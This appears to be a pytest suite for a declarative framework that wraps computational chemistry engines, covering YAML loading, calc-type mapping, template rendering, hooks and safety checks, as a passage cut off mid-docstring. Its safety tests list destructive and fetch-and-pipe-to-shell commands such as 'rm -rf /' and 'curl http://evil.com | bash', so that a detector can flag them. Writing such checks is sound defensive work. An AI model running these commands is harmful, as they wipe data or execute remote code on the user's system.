"""Comprehensive functional tests for the Declarative Engine Framework.

Tests every major aspect end-to-end: YAML loading, registry, calc type
resolution, template rendering, hook system, frontend param export, safety
assessment, custom engine creation, registry bridge, serialization, and
edge cases.

Run with:
    python -m pytest server/tests/test_declarative_engine_functional.py -v
"""
from __future__ import annotations

import asyncio
import json
import os
import sys
import tempfile
from pathlib import Path
from typing import Any

import pytest
import yaml

# Ensure server/ is on sys.path
_server_dir = str(Path(__file__).resolve().parent.parent)
if _server_dir not in sys.path:
    sys.path.insert(0, _server_dir)

from workflow.engine_defs.schema import (
    DANGEROUS_PATTERNS,
    REQUIRED_FIELDS,
    VALID_SAFETY_VALUES,
    EngineSpec,
    InputFileSpec,
    ParamSpec,
    _assess_safety,
    validate_engine_spec,
)
from workflow.engine_runtime import (
    ENGINE_DEFS_DIR,
    TEMPLATES_DIR,
    DeclarativeEngineRuntime,
    _RUNTIME_REGISTRY,
    _render_template,
    all_runtimes,
    build_engine_node_sets,
    build_unified_calc_map,
    get_runtime,
    load_all_engine_defs,
    load_engine_def,
    load_yaml_engine,
)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

EXPECTED_YAML_FILES = [
    "amber.yaml", "cp2k.yaml", "gaussian.yaml", "gromacs.yaml",
    "kmc.yaml", "lammps.yaml", "mlp.yaml", "orca.yaml",
    "qchem.yaml", "qe.yaml", "sella.yaml", "vasp.yaml", "xtb.yaml",
]

EXPECTED_ENGINE_KEYS = [
    "amber", "cp2k", "gaussian", "gromacs", "kmc", "lammps",
    "mlp", "orca", "qchem", "qe", "sella", "vasp", "xtb",
]

SIMPLE_CU_STRUCTURE = json.dumps({
    "@module": "pymatgen.core.structure",
    "@class": "Structure",
    "lattice": {
        "matrix": [[3.615, 0, 0], [0, 3.615, 0], [0, 0, 3.615]],
    },
    "sites": [
        {
            "species": [{"element": "Cu", "occu": 1}],
            "abc": [0, 0, 0],
            "xyz": [0, 0, 0],
        }
    ],
})

# Valid param types in the framework
VALID_PARAM_TYPES = {"string", "number", "boolean", "select", "text"}


def _load_fresh() -> list[DeclarativeEngineRuntime]:
    """Clear registry and load all engine defs fresh."""
    _RUNTIME_REGISTRY.clear()
    return load_all_engine_defs()


# =========================================================================
# 1. Engine Loading & Registry
# =========================================================================

class TestEngineLoading:
    """All 13 YAML engine definitions should load and register correctly."""

    def test_all_yaml_files_exist(self):
        """Every expected YAML file exists in engine_defs/."""
        for fname in EXPECTED_YAML_FILES:
            path = ENGINE_DEFS_DIR / fname
            assert path.exists(), f"Missing YAML file: {path}"

    def test_all_engines_load_without_errors(self):
        """load_all_engine_defs() should load all 13 engines."""
        runtimes = _load_fresh()
        assert len(runtimes) == 13, (
            f"Expected 13 engines, got {len(runtimes)}: "
            f"{[r.spec.engine for r in runtimes]}"
        )

    def test_no_duplicate_engine_keys(self):
        """No two YAML files should define the same engine key."""
        runtimes = _load_fresh()
        keys = [r.spec.engine for r in runtimes]
        assert len(keys) == len(set(keys)), (
            f"Duplicate engine keys found: {keys}"
        )

    def test_all_engines_have_required_fields(self):
        """Every engine spec must have engine, label, params, etc."""
        runtimes = _load_fresh()
        for rt in runtimes:
            spec = rt.spec
            assert spec.engine, "engine must be non-empty"
            assert spec.label, "label must be non-empty"
            assert isinstance(spec.params, list)
            assert isinstance(spec.input_files, dict)
            assert isinstance(spec.run_commands, list)
            assert isinstance(spec.output_files, dict)

    def test_engine_keys_match_filenames(self):
        """xtb.yaml should define engine: xtb, etc."""
        for fname in EXPECTED_YAML_FILES:
            path = ENGINE_DEFS_DIR / fname
            with path.open() as fh:
                raw = yaml.safe_load(fh)
            expected_key = fname.replace(".yaml", "")
            assert raw["engine"] == expected_key, (
                f"{fname} defines engine={raw['engine']!r}, expected {expected_key!r}"
            )

    def test_all_expected_engine_keys_present(self):
        """All 13 expected engine keys are in the registry."""
        runtimes = _load_fresh()
        loaded_keys = {r.spec.engine for r in runtimes}
        for key in EXPECTED_ENGINE_KEYS:
            assert key in loaded_keys, f"Engine {key!r} not found in registry"

    def test_get_runtime_returns_loaded_engines(self):
        """get_runtime() should return a runtime for every loaded engine."""
        _load_fresh()
        for key in EXPECTED_ENGINE_KEYS:
            rt = get_runtime(key)
            assert rt is not None, f"get_runtime({key!r}) returned None"
            assert rt.spec.engine == key

    def test_all_runtimes_returns_all(self):
        """all_runtimes() should return all 13 runtimes."""
        _load_fresh()
        rts = all_runtimes()
        assert len(rts) == 13


# =========================================================================
# 2. Calc Type Resolution
# =========================================================================

class TestCalcTypeResolution:
    """Unified calc types must resolve to correct legacy node types."""

    def setup_method(self):
        _load_fresh()

    def test_all_calc_type_mappings_resolve(self):
        """Every (calc_type, engine) pair in YAML should resolve."""
        for rt in all_runtimes():
            for calc_type, legacy_type in rt.spec.calc_type_mapping.items():
                resolved = rt.resolve_calc_type(calc_type)
                assert resolved == legacy_type, (
                    f"{rt.spec.engine}: resolve_calc_type({calc_type!r}) "
                    f"returned {resolved!r}, expected {legacy_type!r}"
                )

    def test_vasp_mappings(self):
        """VASP: geo_opt->vasp_relax, single_point->vasp_static, etc."""
        rt = get_runtime("vasp")
        assert rt is not None
        assert rt.resolve_calc_type("geo_opt") == "vasp_relax"
        assert rt.resolve_calc_type("single_point") == "vasp_static"
        assert rt.resolve_calc_type("cell_opt") == "bulk_opt"
        assert rt.resolve_calc_type("md") == "vasp_md"
        assert rt.resolve_calc_type("freq") == "frequency"

    def test_orca_mappings(self):
        """ORCA: geo_opt->orca_opt, ts_search->orca_neb_ts, etc."""
        rt = get_runtime("orca")
        assert rt is not None
        assert rt.resolve_calc_type("geo_opt") == "orca_opt"
        assert rt.resolve_calc_type("single_point") == "orca_sp"
        assert rt.resolve_calc_type("freq") == "orca_freq"
        assert rt.resolve_calc_type("ts_search") == "orca_neb_ts"
        assert rt.resolve_calc_type("irc") == "orca_irc"
        assert rt.resolve_calc_type("uvvis") == "orca_uvvis"

    def test_xtb_mappings(self):
        """xTB: geo_opt->xtb_relax, single_point->xtb_static."""
        rt = get_runtime("xtb")
        assert rt is not None
        assert rt.resolve_calc_type("geo_opt") == "xtb_relax"
        assert rt.resolve_calc_type("single_point") == "xtb_static"

    def test_mlp_mappings(self):
        """MLP: geo_opt->mlp_relax, md->mlp_md."""
        rt = get_runtime("mlp")
        assert rt is not None
        assert rt.resolve_calc_type("geo_opt") == "mlp_relax"
        assert rt.resolve_calc_type("md") == "mlp_md"

    def test_cp2k_mappings(self):
        """CP2K: geo_opt->cp2k_geopt, single_point->cp2k_static, etc."""
        rt = get_runtime("cp2k")
        assert rt is not None
        assert rt.resolve_calc_type("geo_opt") == "cp2k_geopt"
        assert rt.resolve_calc_type("single_point") == "cp2k_static"
        assert rt.resolve_calc_type("cell_opt") == "cp2k_cellopt"
        assert rt.resolve_calc_type("md") == "cp2k_md"
        assert rt.resolve_calc_type("freq") == "cp2k_freq"

    def test_lammps_mappings(self):
        """LAMMPS: md->lammps_md, md_minimize->lammps_minimize."""
        rt = get_runtime("lammps")
        assert rt is not None
        assert rt.resolve_calc_type("md") == "lammps_md"
        assert rt.resolve_calc_type("md_minimize") == "lammps_minimize"

    def test_sella_mappings(self):
        """Sella: ts_search->sella_ts."""
        rt = get_runtime("sella")
        assert rt is not None
        assert rt.resolve_calc_type("ts_search") == "sella_ts"

    def test_amber_mappings(self):
        """AMBER: geo_opt->amber_minimize, md->amber_md."""
        rt = get_runtime("amber")
        assert rt is not None
        assert rt.resolve_calc_type("geo_opt") == "amber_minimize"
        assert rt.resolve_calc_type("md") == "amber_md"

    def test_gaussian_mappings(self):
        """Gaussian: geo_opt->gaussian_opt, single_point->gaussian_sp, freq->gaussian_freq."""
        rt = get_runtime("gaussian")
        assert rt is not None
        assert rt.resolve_calc_type("geo_opt") == "gaussian_opt"
        assert rt.resolve_calc_type("single_point") == "gaussian_sp"
        assert rt.resolve_calc_type("freq") == "gaussian_freq"

    def test_gromacs_mappings(self):
        """GROMACS: md->gromacs_md."""
        rt = get_runtime("gromacs")
        assert rt is not None
        assert rt.resolve_calc_type("md") == "gromacs_md"

    def test_no_mapping_conflicts(self):
        """No two engines should map the same calc_type to the same legacy type."""
        seen: dict[str, str] = {}  # legacy_type -> engine
        for rt in all_runtimes():
            for calc_type, legacy_type in rt.spec.calc_type_mapping.items():
                if legacy_type in seen:
                    # Same legacy type mapped by different engines is OK only
                    # if they come from the same engine (which can't happen since
                    # calc_type_mapping is a dict per engine), or if it's
                    # intentionally shared (e.g. mlp_relax used by md_minimize+mlp)
                    pass
                seen[legacy_type] = rt.spec.engine

    def test_resolve_software_uses_declarative_map(self):
        """node_sets._resolve_software should find entries from YAML."""
        from workflow.node_sets import _resolve_software

        resolved, sw = _resolve_software("geo_opt", {"software": "vasp"})
        assert resolved == "vasp_relax"
        assert sw == "vasp"

        resolved, sw = _resolve_software("geo_opt", {"software": "orca"})
        assert resolved == "orca_opt"
        assert sw == "orca"

        resolved, sw = _resolve_software("ts_search", {"software": "sella"})
        assert resolved == "sella_ts"
        assert sw == "sella"

    def test_unknown_calc_type_returns_none(self):
        """resolve_calc_type with unknown type returns None."""
        rt = get_runtime("vasp")
        assert rt is not None
        assert rt.resolve_calc_type("nonexistent_type") is None


# =========================================================================
# 3. Template Rendering (xTB + MLP)
# =========================================================================

class TestTemplateRendering:
    """Jinja2 templates should produce valid, executable Python scripts."""

    def setup_method(self):
        _load_fresh()

    def _render(self, template_path: str, params: dict, node_type: str) -> str:
        return _render_template(template_path, params, SIMPLE_CU_STRUCTURE, node_type)

    def _assert_valid_python(self, content: str, label: str = ""):
        """Assert that content compiles as valid Python."""
        try:
            compile(content, f"<test:{label}>", "exec")
        except SyntaxError as exc:
            pytest.fail(f"Invalid Python in {label}: {exc}\n\n{content}")

    def test_xtb_relax_produces_valid_python(self):
        """xTB relax template should compile as valid Python."""
        content = self._render(
            "xtb/run_xtb.py.j2",
            {"method": "GFN2-xTB", "accuracy": 1.0, "electronic_temperature": 300,
             "fmax": 0.01, "max_steps": 500},
            "xtb_relax",
        )
        self._assert_valid_python(content, "xtb_relax")
        assert "BFGS" in content
        assert "opt.run" in content
        assert "GFN2-xTB" in content

    def test_xtb_static_produces_valid_python(self):
        """xTB static template should compile as valid Python."""
        content = self._render(
            "xtb/run_xtb.py.j2",
            {"method": "GFN2-xTB", "accuracy": 1.0, "electronic_temperature": 300},
            "xtb_static",
        )
        self._assert_valid_python(content, "xtb_static")
        assert "get_potential_energy" in content
        assert "get_forces" in content

    def test_xtb_template_uses_all_params(self):
        """Every xTB param should appear in rendered output when set."""
        content = self._render(
            "xtb/run_xtb.py.j2",
            {"method": "GFN1-xTB", "accuracy": 0.5, "electronic_temperature": 500,
             "fmax": 0.05, "max_steps": 200},
            "xtb_relax",
        )
        assert "GFN1-xTB" in content
        assert "0.5" in content
        assert "500" in content
        assert "0.05" in content
        assert "200" in content

    def test_mlp_relax_mace(self):
        """MLP template should handle mace-mp-0."""
        content = self._render(
            "mlp/run_mlp.py.j2",
            {"model": "mace-mp-0", "optimizer": "BFGS", "fmax": 0.01,
             "max_steps": 500, "relax_cell": False},
            "mlp_relax",
        )
        self._assert_valid_python(content, "mlp_relax_mace")
        assert "mace_mp" in content
        assert "BFGS" in content

    def test_mlp_relax_chgnet(self):
        """MLP template should handle chgnet."""
        content = self._render(
            "mlp/run_mlp.py.j2",
            {"model": "chgnet", "optimizer": "FIRE", "fmax": 0.01,
             "max_steps": 500, "relax_cell": False},
            "mlp_relax",
        )
        self._assert_valid_python(content, "mlp_relax_chgnet")
        assert "CHGNetCalculator" in content
        assert "FIRE" in content

    def test_mlp_relax_m3gnet(self):
        """MLP template should handle m3gnet."""
        content = self._render(
            "mlp/run_mlp.py.j2",
            {"model": "m3gnet", "optimizer": "LBFGS", "fmax": 0.01,
             "max_steps": 500, "relax_cell": False},
            "mlp_relax",
        )
        self._assert_valid_python(content, "mlp_relax_m3gnet")
        assert "M3GNetCalculator" in content
        assert "LBFGS" in content

    def test_mlp_md_produces_valid_python(self):
        """MLP MD template should produce valid Python."""
        content = self._render(
            "mlp/run_mlp.py.j2",
            {"model": "mace-mp-0", "temp": 300, "steps": 1000, "timestep": 1.0},
            "mlp_md",
        )
        self._assert_valid_python(content, "mlp_md")
        assert "Langevin" in content
        assert "dyn.run" in content

    def test_mlp_relax_cell_option(self):
        """relax_cell=True should include ExpCellFilter."""
        content = self._render(
            "mlp/run_mlp.py.j2",
            {"model": "mace-mp-0", "optimizer": "BFGS", "fmax": 0.01,
             "max_steps": 500, "relax_cell": True},
            "mlp_relax",
        )
        self._assert_valid_python(content, "mlp_relax_cell")
        assert "ExpCellFilter" in content

    def test_mlp_relax_no_cell_filter(self):
        """relax_cell=False should NOT include ExpCellFilter."""
        content = self._render(
            "mlp/run_mlp.py.j2",
            {"model": "mace-mp-0", "optimizer": "BFGS", "fmax": 0.01,
             "max_steps": 500, "relax_cell": False},
            "mlp_relax",
        )
        assert "ExpCellFilter" not in content

    def test_mlp_optimizer_options(self):
        """BFGS, FIRE, LBFGS should all render correctly."""
        for opt_name in ["BFGS", "FIRE", "LBFGS"]:
            content = self._render(
                "mlp/run_mlp.py.j2",
                {"model": "mace-mp-0", "optimizer": opt_name, "fmax": 0.01,
                 "max_steps": 500, "relax_cell": False},
                "mlp_relax",
            )
            self._assert_valid_python(content, f"mlp_relax_{opt_name}")
            assert f"from ase.optimize import {opt_name}" in content

    def test_template_with_default_params_xtb(self):
        """Templates should work with only default param values."""
        # Use .get() defaults that match what the template expects
        content = self._render(
            "xtb/run_xtb.py.j2",
            {},  # empty params - template uses .get() with defaults
            "xtb_relax",
        )
        self._assert_valid_python(content, "xtb_relax_defaults")

    def test_template_with_default_params_mlp(self):
        """MLP templates should work with only default param values."""
        content = self._render(
            "mlp/run_mlp.py.j2",
            {},  # empty params - template uses .get() with defaults
            "mlp_relax",
        )
        self._assert_valid_python(content, "mlp_relax_defaults")


# =========================================================================
# 4. Hook System
# =========================================================================

class TestHookSystem:
    """Hooks should call existing generators and produce _generated_files."""

    def setup_method(self):
        _load_fresh()

    def _run_hook(self, hook_path: str, params: dict, structure_str: str | None):
        """Import and run an async hook, returning (params, structure_str)."""
        import importlib

        if ":" in hook_path:
            module_path, func_name = hook_path.rsplit(":", 1)
        else:
            module_path, func_name = hook_path, "run"

        mod = importlib.import_module(module_path)
        func = getattr(mod, func_name)
        return asyncio.get_event_loop().run_until_complete(
            func(params, structure_str)
        )

    def test_orca_hook_produces_files(self):
        """ORCA hook should produce ORCA.inp file."""
        params = {
            "_node_type": "orca_sp",
            "method": "B3LYP",
            "basis_set": "def2-SVP",
            "charge": 0,
            "multiplicity": 1,
            "num_cores": 4,
        }
        result_params, _ = self._run_hook(
            "workflow.hooks.orca_hooks:generate_inputs",
            params,
            SIMPLE_CU_STRUCTURE,
        )
        files = result_params.get("_generated_files", {})
        assert "ORCA.inp" in files
        assert len(files["ORCA.inp"]) > 0

    def test_cp2k_hook_produces_files(self):
        """CP2K hook should produce project.inp file."""
        params = {"_node_type": "cp2k_static"}
        result_params, _ = self._run_hook(
            "workflow.hooks.cp2k_hooks:generate_inputs",
            params,
            SIMPLE_CU_STRUCTURE,
        )
        files = result_params.get("_generated_files", {})
        assert "project.inp" in files
        assert len(files["project.inp"]) > 0

    def test_vasp_hook_produces_files_and_poscar_info(self):
        """VASP hook should produce INCAR, KPOINTS, POSCAR + _vasp_poscar_obj."""
        params = {"_node_type": "vasp_relax"}
        result_params, _ = self._run_hook(
            "workflow.hooks.vasp_hooks:generate_inputs",
            params,
            SIMPLE_CU_STRUCTURE,
        )
        files = result_params.get("_generated_files", {})
        assert "INCAR" in files
        assert "KPOINTS" in files
        assert "POSCAR" in files
        assert result_params.get("_vasp_poscar_obj") is not None

    def test_sella_hook_produces_files(self):
        """Sella hook should produce run_sella.py and POSCAR."""
        params = {
            "_node_type": "sella_ts",
            "calculator": "xtb",
            "fmax": 0.01,
            "max_steps": 200,
        }
        result_params, _ = self._run_hook(
            "workflow.hooks.sella_hooks:generate_inputs",
            params,
            SIMPLE_CU_STRUCTURE,
        )
        files = result_params.get("_generated_files", {})
        assert "run_sella.py" in files

    def test_amber_hook_produces_files(self):
        """AMBER hook should produce mdin file."""
        params = {"_node_type": "amber_md"}
        result_params, _ = self._run_hook(
            "workflow.hooks.amber_hooks:generate_inputs",
            params,
            None,
        )
        files = result_params.get("_generated_files", {})
        assert "mdin" in files
        assert len(files["mdin"]) > 0

    def test_lammps_hook_import_error_is_known(self):
        """LAMMPS hook has a known import error (extract_structure_info).

        This test documents the existing issue rather than hiding it.
        The LAMMPS input generation works via the preview endpoint,
        but the hook path has a broken import.
        """
        params = {
            "_node_type": "lammps_md",
            "pair_style": "lj/cut 2.5",
            "pair_coeff": "* * 1.0 1.0",
        }
        with pytest.raises(ImportError):
            self._run_hook(
                "workflow.hooks.lammps_hooks:generate_inputs",
                params,
                SIMPLE_CU_STRUCTURE,
            )

    def test_hook_path_resolution(self):
        """Hook paths like 'workflow.hooks.orca_hooks:generate_inputs' should resolve."""
        import importlib

        hook_paths = [
            "workflow.hooks.orca_hooks:generate_inputs",
            "workflow.hooks.cp2k_hooks:generate_inputs",
            "workflow.hooks.vasp_hooks:generate_inputs",
            "workflow.hooks.sella_hooks:generate_inputs",
            "workflow.hooks.amber_hooks:generate_inputs",
            "workflow.hooks.kmc_hooks:generate_inputs",
        ]
        for hook_path in hook_paths:
            module_path, func_name = hook_path.rsplit(":", 1)
            mod = importlib.import_module(module_path)
            func = getattr(mod, func_name)
            assert callable(func), f"Hook {hook_path} is not callable"

    def test_hook_returns_correct_tuple(self):
        """All hooks return (params_dict, structure_str) tuple."""
        params = {"_node_type": "amber_md"}
        result = self._run_hook(
            "workflow.hooks.amber_hooks:generate_inputs",
            params,
            None,
        )
        assert isinstance(result, tuple)
        assert len(result) == 2
        assert isinstance(result[0], dict)

    def test_kmc_hook_produces_files(self):
        """KMC hook should produce model.json file."""
        params = {
            "_node_type": "kmc",
            "mode": "kmc",
            "temperature": 300,
            "potential": 0.0,
            "lattice_size": 20,
            "kmc_steps": 100000,
        }
        result_params, _ = self._run_hook(
            "workflow.hooks.kmc_hooks:generate_inputs",
            params,
            None,
        )
        files = result_params.get("_generated_files", {})
        assert "model.json" in files


# =========================================================================
# 5. Frontend Param Export
# =========================================================================

class TestFrontendParamExport:
    """to_frontend_params() should produce correct ParamDef-compatible dicts."""

    def setup_method(self):
        _load_fresh()

    def test_all_params_have_software_gate(self):
        """Every param from every engine should have show_if with software key."""
        for rt in all_runtimes():
            frontend_params = rt.to_frontend_params()
            for p in frontend_params:
                show_if = p.get("show_if")
                assert show_if is not None, (
                    f"Engine {rt.spec.engine}, param {p['key']}: missing show_if"
                )
                # show_if is either a dict with key=software or a list containing
                # a dict with key=software
                if isinstance(show_if, list):
                    sw_keys = [c.get("key") for c in show_if if isinstance(c, dict)]
                    assert "software" in sw_keys, (
                        f"Engine {rt.spec.engine}, param {p['key']}: "
                        f"show_if list missing software gate: {show_if}"
                    )
                elif isinstance(show_if, dict):
                    assert show_if.get("key") == "software", (
                        f"Engine {rt.spec.engine}, param {p['key']}: "
                        f"show_if dict not a software gate: {show_if}"
                    )

    def test_show_if_preserves_calc_type_condition(self):
        """Params with calc_type show_if should keep both conditions."""
        rt = get_runtime("xtb")
        assert rt is not None
        frontend_params = rt.to_frontend_params()
        fmax_param = next((p for p in frontend_params if p["key"] == "fmax"), None)
        assert fmax_param is not None
        show_if = fmax_param["show_if"]
        # Should be a list with both calc_type and software conditions
        assert isinstance(show_if, list), f"Expected list, got {type(show_if)}"
        keys = [c.get("key") for c in show_if]
        assert "calc_type" in keys
        assert "software" in keys

    def test_param_types_are_valid(self):
        """All param types should be in the allowed set."""
        for rt in all_runtimes():
            for p in rt.spec.params:
                assert p.type in VALID_PARAM_TYPES, (
                    f"Engine {rt.spec.engine}, param {p.key}: "
                    f"invalid type {p.type!r}"
                )

    def test_select_params_have_options(self):
        """Every select-type param should have options list."""
        for rt in all_runtimes():
            for p in rt.spec.params:
                if p.type == "select":
                    assert p.options is not None and len(p.options) > 0, (
                        f"Engine {rt.spec.engine}, param {p.key}: "
                        f"select type but no options"
                    )

    def test_number_params_have_defaults(self):
        """Number params should have reasonable defaults."""
        for rt in all_runtimes():
            for p in rt.spec.params:
                if p.type == "number":
                    assert p.default is not None, (
                        f"Engine {rt.spec.engine}, param {p.key}: "
                        f"number type but no default"
                    )

    def test_frontend_params_are_plain_dicts(self):
        """Frontend params should be plain dicts, no dataclass instances."""
        for rt in all_runtimes():
            frontend_params = rt.to_frontend_params()
            for p in frontend_params:
                assert isinstance(p, dict), f"Expected dict, got {type(p)}"
                for key, val in p.items():
                    assert not hasattr(val, "__dataclass_fields__"), (
                        f"Engine {rt.spec.engine}, param {p.get('key')}: "
                        f"field {key} is a dataclass, not a plain value"
                    )

    def test_software_gate_values_match_engine_key(self):
        """The software gate should reference the correct engine key."""
        for rt in all_runtimes():
            frontend_params = rt.to_frontend_params()
            for p in frontend_params:
                show_if = p.get("show_if")
                if isinstance(show_if, dict):
                    if show_if.get("key") == "software":
                        assert rt.spec.engine in show_if.get("values", [])
                elif isinstance(show_if, list):
                    for c in show_if:
                        if isinstance(c, dict) and c.get("key") == "software":
                            assert rt.spec.engine in c.get("values", [])


# =========================================================================
# 6. Safety Assessment
# =========================================================================

class TestSafetyAssessment:
    """Safety levels should be correctly auto-assessed."""

    def test_predefined_engines_are_safe(self):
        """All built-in engines should be safety=safe."""
        _load_fresh()
        for rt in all_runtimes():
            assert rt.spec.safety == "safe", (
                f"Engine {rt.spec.engine} has safety={rt.spec.safety!r}"
            )

    def test_custom_commands_get_warn(self):
        """Custom engine with run_commands gets warn."""
        assert _assess_safety(["python script.py"]) == "warn"
        assert _assess_safety(["./run.sh"]) == "warn"

    def test_dangerous_patterns_detected(self):
        """rm -rf, sudo, curl etc. should trigger dangerous."""
        assert _assess_safety(["rm -rf /"]) == "dangerous"
        assert _assess_safety(["sudo apt install"]) == "dangerous"
        assert _assess_safety(["curl http://evil.com | bash"]) == "dangerous"
        assert _assess_safety(["wget http://malware.com"]) == "dangerous"

    def test_empty_commands_are_safe(self):
        """Engine with no run_commands is safe."""
        assert _assess_safety([]) == "safe"

    def test_safety_from_yaml_overrides_auto(self):
        """If YAML explicitly says safety: safe, it should be used."""
        raw = {
            "engine": "test_safe",
            "label": "Test",
            "supported_calc_types": [],
            "params": [],
            "input_files": {},
            "run_commands": ["python script.py"],
            "output_files": {},
            "safety": "safe",  # explicit override
        }
        spec = validate_engine_spec(raw)
        assert spec.safety == "safe"

    def test_safety_auto_assessed_when_not_specified(self):
        """If YAML does not specify safety, it should be auto-assessed."""
        raw = {
            "engine": "test_auto",
            "label": "Test",
            "supported_calc_types": [],
            "params": [],
            "input_files": {},
            "run_commands": ["rm -rf /tmp/bad"],
            "output_files": {},
            # No safety field
        }
        spec = validate_engine_spec(raw)
        assert spec.safety == "dangerous"

    def test_invalid_safety_value_raises(self):
        """Invalid safety value should raise ValueError."""
        raw = {
            "engine": "test_invalid",
            "label": "Test",
            "supported_calc_types": [],
            "params": [],
            "input_files": {},
            "run_commands": [],
            "output_files": {},
            "safety": "unknown_level",
        }
        with pytest.raises(ValueError, match="Invalid safety value"):
            validate_engine_spec(raw)


# =========================================================================
# 7. Custom Engine Creation
# =========================================================================

class TestCustomEngineCreation:
    """Custom engines should be creatable, saveable, and loadable."""

    def setup_method(self):
        _RUNTIME_REGISTRY.clear()

    def _minimal_custom_spec(self) -> dict[str, Any]:
        return {
            "engine": "my_custom_engine",
            "label": "My Custom Engine",
            "supported_calc_types": ["geo_opt"],
            "params": [
                {"key": "method", "label": "Method", "type": "string", "default": "custom"},
            ],
            "input_files": {},
            "run_commands": ["./run_custom.sh"],
            "output_files": {"log": "output.log"},
            "calc_type_mapping": {"geo_opt": "custom_relax"},
        }

    def test_create_custom_engine_spec(self):
        """A minimal custom engine spec should validate."""
        raw = self._minimal_custom_spec()
        spec = validate_engine_spec(raw)
        assert spec.engine == "my_custom_engine"
        assert spec.label == "My Custom Engine"
        assert len(spec.params) == 1

    def test_custom_engine_registers_in_runtime(self):
        """After load_engine_def, get_runtime should find it."""
        raw = self._minimal_custom_spec()
        load_engine_def(raw)
        rt = get_runtime("my_custom_engine")
        assert rt is not None
        assert rt.spec.engine == "my_custom_engine"

    def test_custom_engine_yaml_persistence(self):
        """Custom engine should be saveable as YAML and reloadable."""
        raw = self._minimal_custom_spec()
        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".yaml", delete=False
        ) as fh:
            yaml.dump(raw, fh)
            tmp_path = Path(fh.name)
        try:
            rt = load_yaml_engine(tmp_path)
            assert rt.spec.engine == "my_custom_engine"
            assert get_runtime("my_custom_engine") is not None
        finally:
            tmp_path.unlink()

    def test_custom_engine_safety_auto_assessed(self):
        """Custom engine with commands should auto-assess safety."""
        raw = self._minimal_custom_spec()
        # No explicit safety, has run_commands -> should be "warn"
        spec = validate_engine_spec(raw)
        assert spec.safety == "warn"

    def test_custom_engine_with_dangerous_commands(self):
        """Custom engine with dangerous commands should be flagged."""
        raw = self._minimal_custom_spec()
        raw["run_commands"] = ["sudo rm -rf /"]
        spec = validate_engine_spec(raw)
        assert spec.safety == "dangerous"

    def test_custom_engine_calc_type_resolution(self):
        """Custom engine calc_type_mapping should be usable."""
        raw = self._minimal_custom_spec()
        rt = load_engine_def(raw)
        assert rt.resolve_calc_type("geo_opt") == "custom_relax"

    def test_custom_engine_appears_in_unified_map(self):
        """Custom engine should appear in build_unified_calc_map."""
        raw = self._minimal_custom_spec()
        load_engine_def(raw)
        calc_map = build_unified_calc_map()
        assert ("geo_opt", "my_custom_engine") in calc_map
        assert calc_map[("geo_opt", "my_custom_engine")] == "custom_relax"


# =========================================================================
# 8. Registry Bridge
# =========================================================================

class TestRegistryBridge:
    """Declarative engines should bridge into the existing engine registry."""

    def setup_method(self):
        _load_fresh()

    def test_unified_calc_map_is_complete(self):
        """build_unified_calc_map should include all YAML-defined mappings."""
        calc_map = build_unified_calc_map()
        # Check a representative set of entries
        assert calc_map.get(("geo_opt", "vasp")) == "vasp_relax"
        assert calc_map.get(("single_point", "orca")) == "orca_sp"
        assert calc_map.get(("md", "lammps")) == "lammps_md"
        assert calc_map.get(("ts_search", "sella")) == "sella_ts"
        assert calc_map.get(("geo_opt", "mlp")) == "mlp_relax"
        assert calc_map.get(("freq", "cp2k")) == "cp2k_freq"

    def test_unified_calc_map_total_entries(self):
        """Unified calc map should contain all entries from all engines."""
        calc_map = build_unified_calc_map()
        # Count expected entries from all YAMLs
        expected_count = 0
        for rt in all_runtimes():
            expected_count += len(rt.spec.calc_type_mapping)
        assert len(calc_map) == expected_count

    def test_build_engine_node_sets(self):
        """build_engine_node_sets should group legacy types by engine."""
        node_sets = build_engine_node_sets()
        assert "vasp" in node_sets
        assert "vasp_relax" in node_sets["vasp"]
        assert "vasp_static" in node_sets["vasp"]
        assert "orca" in node_sets
        assert "orca_opt" in node_sets["orca"]
        assert "mlp" in node_sets
        assert "mlp_relax" in node_sets["mlp"]

    def test_build_engine_node_sets_covers_all_engines(self):
        """Every engine with calc_type_mapping should appear in node sets."""
        node_sets = build_engine_node_sets()
        for rt in all_runtimes():
            if rt.spec.calc_type_mapping:
                assert rt.spec.engine in node_sets, (
                    f"Engine {rt.spec.engine} missing from node sets"
                )

    def test_handwritten_engines_take_priority(self):
        """VASP/ORCA/CP2K etc. handwritten engines should NOT be overridden by YAML.

        _resolve_software tries declarative map first, but the resolved legacy
        types should match what the handwritten engines expect.
        """
        from workflow.node_sets import _resolve_software

        # Declarative map should produce the SAME legacy types as the
        # handwritten fallback map, so behavior is identical regardless
        # of whether declarative or fallback is used.
        test_cases = [
            ("geo_opt", "vasp", "vasp_relax"),
            ("single_point", "vasp", "vasp_static"),
            ("geo_opt", "orca", "orca_opt"),
            ("geo_opt", "cp2k", "cp2k_geopt"),
            ("md", "lammps", "lammps_md"),
        ]
        for calc_type, sw, expected in test_cases:
            resolved, _ = _resolve_software(calc_type, {"software": sw})
            assert resolved == expected, (
                f"_resolve_software({calc_type!r}, {sw!r}) = {resolved!r}, "
                f"expected {expected!r}"
            )


# =========================================================================
# 9. Serialization (API-ready)
# =========================================================================

class TestSerialization:
    """to_dict() output should be JSON-serializable and complete."""

    def setup_method(self):
        _load_fresh()

    def test_all_engines_serialize_to_json(self):
        """Every engine's to_dict() should be JSON-serializable."""
        for rt in all_runtimes():
            d = rt.to_dict()
            try:
                json_str = json.dumps(d)
            except (TypeError, ValueError) as exc:
                pytest.fail(
                    f"Engine {rt.spec.engine} to_dict() not JSON-serializable: {exc}"
                )
            assert len(json_str) > 0

    def test_serialized_params_are_plain_dicts(self):
        """No dataclass instances in serialized output."""
        for rt in all_runtimes():
            d = rt.to_dict()
            for p in d["params"]:
                assert isinstance(p, dict), (
                    f"Engine {rt.spec.engine}: param is {type(p)}, not dict"
                )

    def test_serialized_has_all_required_keys(self):
        """Serialized dict should have all expected top-level keys."""
        expected_keys = {
            "engine", "label", "description", "supported_calc_types",
            "params", "run_commands", "output_files", "environment",
            "safety", "calc_type_mapping",
        }
        for rt in all_runtimes():
            d = rt.to_dict()
            missing = expected_keys - set(d.keys())
            assert not missing, (
                f"Engine {rt.spec.engine}: missing keys {missing}"
            )

    def test_serialized_round_trip(self):
        """JSON encode + decode should preserve all data."""
        for rt in all_runtimes():
            d = rt.to_dict()
            json_str = json.dumps(d)
            restored = json.loads(json_str)
            assert restored["engine"] == d["engine"]
            assert restored["label"] == d["label"]
            assert len(restored["params"]) == len(d["params"])

    def test_serialized_input_files_not_in_output(self):
        """input_files are not in the serialized output (by design).

